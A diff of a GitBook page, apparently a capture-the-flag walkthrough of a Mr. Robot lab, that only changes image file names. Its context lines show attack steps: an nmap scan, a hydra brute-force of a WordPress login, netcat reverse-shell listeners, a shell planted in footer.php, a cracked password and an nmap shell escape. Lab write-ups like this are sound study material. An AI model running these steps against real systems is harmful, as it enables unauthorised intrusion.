@@ -14,7 +14,7 @@
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -97,7 +97,7 @@ hydra -L Elliot -P fsocity.dic  $VICTIM http-post-form "/wp-login.php:log=^USER^
 10.10.70.148%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
 ```
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Reverse Shell
 
@@ -121,13 +121,13 @@ nc -lvnp 443
 
 
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 Connection is made but it isn't stable.
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -151,7 +151,7 @@ nc -vlnp 443
 
 Added the same shell to footer.php which should appear on every page visited. Then I just went back to http://$VICTIM/join and it worked.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -175,7 +175,7 @@ ls
 cat password.raw-md5 
 ```
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -193,7 +193,7 @@ su robot
 Password: abcdefghijklmnopqrstuvwxyz
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### LinPeas
 
@@ -224,6 +224,6 @@ chmod +x linpeas.sh
 nmap> !sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
